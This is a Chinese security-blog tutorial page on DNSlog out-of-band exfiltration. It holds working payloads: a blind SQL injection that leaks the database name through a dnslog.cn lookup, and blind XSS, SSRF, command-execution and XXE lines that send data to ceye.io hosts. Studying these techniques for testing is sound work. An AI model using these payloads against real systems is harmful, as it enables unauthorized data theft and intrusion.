@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta property="og:type" content="article">
+<meta property="og:title" content="DNSlog介绍">
+<meta property="og:url" content="https://www.buhuixiu.com/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/">
+<meta property="og:site_name" content="Sampson&#39;s blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.buhuixiu.com/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/20211215044336991.png">
+<meta property="og:image" content="https://www.buhuixiu.com/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/20211215044618708.png">
+<meta property="article:published_time" content="2021-12-15T08:36:01.000Z">
+<meta property="article:modified_time" content="2021-12-15T08:36:01.000Z">
+<meta property="article:author" content="Sampson.Z">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.buhuixiu.com/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/20211215044336991.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>DNSlog介绍</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/zhuxinkai.site/">zhuxinkai.site</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇 " href="/2021/12/15/Logj4j2/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2021/11/18/k8s%E9%9B%86%E7%BE%A4%E7%9A%84%E9%AB%98%E5%8F%AF%E7%94%A8/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.buhuixiu.com/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.buhuixiu.com/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/&text=DNSlog介绍"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.buhuixiu.com/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/&title=DNSlog介绍"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.buhuixiu.com/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/&is_video=false&description=DNSlog介绍"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DNSlog介绍&body=Check out this article: https://www.buhuixiu.com/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.buhuixiu.com/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/&title=DNSlog介绍"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.buhuixiu.com/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/&title=DNSlog介绍"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.buhuixiu.com/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/&title=DNSlog介绍"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.buhuixiu.com/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/&title=DNSlog介绍"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.buhuixiu.com/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/&name=DNSlog介绍&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://www.buhuixiu.com/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/&t=DNSlog介绍"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-DNSlog-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">0x00 DNSlog 介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-DNSlog%E5%9B%9E%E6%98%BE%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">0x01 DNSlog回显原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-DNSlog-%E5%BA%94%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">0x02 DNSlog 应用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-DNSlog%E5%9B%9E%E6%98%BE%E6%B3%A8%E5%85%A5%E6%9D%A1%E4%BB%B6"><span class="toc-number">4.</span> <span class="toc-text">0x03 DNSlog回显注入条件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-DNSlog-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">0x04 DNSlog -sql注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-DNSlog-%E5%85%B6%E4%BB%96%E5%BA%94%E7%94%A8"><span class="toc-number">6.</span> <span class="toc-text">0x05 DNSlog 其他应用</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        DNSlog介绍
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Sampson.Z</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-12-15T08:36:01.000Z" itemprop="datePublished">2021-12-15</time>
+        
+        (Updated: <time datetime="2021-12-15T08:36:01.000Z" itemprop="dateModified">2021-12-15</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <p>转自： <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53577336/category_11194952.html">https://blog.csdn.net/qq_53577336/category_11194952.html</a><p></p>
+<h1 id="0x00-DNSlog-介绍"><a href="#0x00-DNSlog-介绍" class="headerlink" title="0x00 DNSlog 介绍"></a>0x00 DNSlog 介绍</h1><pre><code>首先我们知道DNS是起ip与域名的解析的服务，通过ip可以解析到对应的域名。DNSlog就是储存在DNS上的域名相关的信息，它记录着
+你对域名或者IP的访问信息，也就是类似于日志文件，
+</code></pre>
+<h1 id="0x01-DNSlog回显原理"><a href="#0x01-DNSlog回显原理" class="headerlink" title="0x01 DNSlog回显原理"></a>0x01 DNSlog回显原理</h1><pre><code>首先了解一下多级域名的概念，我们知道因特网采用树状结构命名方法，按组织结构划分域是一个名字空间中一个被管理的划分，域可
+划分为子域，子域再可被划分为多级域名称为一级域名，二级域名，三级域名，从一个域名地址来从右到左依次是顶级域名，二级域
+名，三级域名,例如 gaobai.kxsy.com,
+通俗的说就是我有个域名kxsy.work，我将域名设置对应的ip 2.2.2.2 上，这样当我向dns服务器发起kxsy.work的解析请求时，
+DNSlog中会记录下他给kxsy.work解析，解析值为2.2.2.2，而我们这个解析的记录的值就是我们要利用的地方,这个过程被记录下来
+就是DNSlog,
+</code></pre>
+<h1 id="0x02-DNSlog-应用"><a href="#0x02-DNSlog-应用" class="headerlink" title="0x02 DNSlog 应用"></a>0x02 DNSlog 应用</h1><p>1.sql布尔盲注、时间盲注，注入的效率低且线程高容易被waf拦截，又或者是目标站点没有回显可利用NDSlog<br>2.无回显的命令执行<br>推荐三个大众化的免费dns解析记录网站</p>
+<pre><code>http://www.dnslog.cn
+http://admin.dnslog.link
+http://ceye.io
+</code></pre>
+<h1 id="0x03-DNSlog回显注入条件"><a href="#0x03-DNSlog回显注入条件" class="headerlink" title="0x03 DNSlog回显注入条件"></a>0x03 DNSlog回显注入条件</h1><p>1.数据库root权限，<br>2.数据库可读写权限，secure_file_priv值为空，上期笔记有说明，<br>3.windows系统   </p>
+<h1 id="0x04-DNSlog-sql注入"><a href="#0x04-DNSlog-sql注入" class="headerlink" title="0x04 DNSlog -sql注入"></a>0x04 DNSlog -sql注入</h1><p>1.注册一个dns解析服务，利用唯一标识符，以无回显sql注入为例<br><a href="/DNSlog%E4%BB%8B%E7%BB%8D/20211215044336991.png" class="gallery-item"><img src="/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/20211215044336991.png"></a><br>2.注入测试 需要闭合语句 替换标识符 利用盲注回显    </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?id=1&#x27; and if((select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.tlyypi.dnslog.cn\\abc&#x27;))),1,0)--+<br></code></pre></td></tr></table></figure>
+<p><a href="/DNSlog%E4%BB%8B%E7%BB%8D/20211215044618708.png" class="gallery-item"><img src="/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/20211215044618708.png"></a><br>在回显数据时，域名能够接受的字符是有条件限制的，某些不适合作为域名的特殊字符可能会被屏蔽掉，针对这种情况我们也可以base64编码后再进行请求。</p>
+<h1 id="0x05-DNSlog-其他应用"><a href="#0x05-DNSlog-其他应用" class="headerlink" title="0x05 DNSlog 其他应用"></a>0x05 DNSlog 其他应用</h1><p>1.xss盲打</p>
+<pre><code>&quot;&lt;script src=http://XSS.XXXXX.ceye.io&gt;&lt;/script&gt;&quot;
+</code></pre>
+<p>2.SSRF</p>
+<pre><code>&quot;... &lt;!ENTITY test SYSTEM &quot;SSRF.xxxx.ceye.io\\aa&quot;&gt; ...&quot;
+</code></pre>
+<p>3.命令执行</p>
+<pre><code>&quot; ping %PATH%.pxxx.ceye.io ...&quot;
+</code></pre>
+<p>1<br>4.XXE<br>XXE漏洞可以解析外部实体，就可以拿来读取本地服务器文件，这时，我们只需把dtd文件改成这样</p>
+<pre><code>&lt;!ENTITY % all
+&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://XXXX.ceye.io/%file;&#39;&gt;&quot;
+&gt;
+%all;
+</code></pre>
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+
+
+
+
+		<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+		<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+		<!--<script src="//cdn.jsdelivr.net/npm/leancloud-storage@latest/dist/av-min.js"></script>
+    <script src='//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js'></script>-->
+	<div id="vcomments"></div>
+	<script>
+		var notify = false == true ? true : false;
+		var verify = false == true ? true : false;
+		var visitor = true == true ? true : false;
+  new Valine({
+      el: '#vcomments',
+				notify: notify,
+				verify: verify,
+    	app_id: 'blb6PJsThCi2aLC84uljjQzT-gzGzoHsz',
+      app_key: '1PBJebm7VF0AiFpsf6Hhapdv',
+			lang: 'en',
+			placeholder: 'ヾﾉ≧∀≦)o快来评论一下吧!',
+			avatar: 'monsterid',
+			pageSize: 10,
+			visitor: visitor
+        });
+    </script>
+
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/zhuxinkai.site/">zhuxinkai.site</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-DNSlog-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">0x00 DNSlog 介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-DNSlog%E5%9B%9E%E6%98%BE%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">0x01 DNSlog回显原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-DNSlog-%E5%BA%94%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">0x02 DNSlog 应用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-DNSlog%E5%9B%9E%E6%98%BE%E6%B3%A8%E5%85%A5%E6%9D%A1%E4%BB%B6"><span class="toc-number">4.</span> <span class="toc-text">0x03 DNSlog回显注入条件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-DNSlog-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">0x04 DNSlog -sql注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-DNSlog-%E5%85%B6%E4%BB%96%E5%BA%94%E7%94%A8"><span class="toc-number">6.</span> <span class="toc-text">0x05 DNSlog 其他应用</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.buhuixiu.com/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.buhuixiu.com/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/&text=DNSlog介绍"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.buhuixiu.com/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/&title=DNSlog介绍"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.buhuixiu.com/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/&is_video=false&description=DNSlog介绍"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DNSlog介绍&body=Check out this article: https://www.buhuixiu.com/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.buhuixiu.com/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/&title=DNSlog介绍"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.buhuixiu.com/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/&title=DNSlog介绍"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.buhuixiu.com/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/&title=DNSlog介绍"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.buhuixiu.com/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/&title=DNSlog介绍"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.buhuixiu.com/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/&name=DNSlog介绍&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://www.buhuixiu.com/2021/12/15/DNSlog%E4%BB%8B%E7%BB%8D/&t=DNSlog介绍"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-right">
+    Copyright &copy;
+    
+    
+    2016-2021
+    Sampson.Z
+<img src="https://www.buhuixiu.com/images/jgawb.png">
+<a href="http://www.beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">粤ICP备19066509号</a>
+
+  
+  
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/zhuxinkai.site/">zhuxinkai.site</a></li>
+        
+      </ul>
+    </nav>
+  
+
+
+
+        <!-- 不蒜子统计 -->
+        <span id="busuanzi_container_site_pv">
+                本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        </span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv" style='display:none'>
+                本站访客数<span id="busuanzi_value_site_uv"></span>人
+        </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+</div>
+
+
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
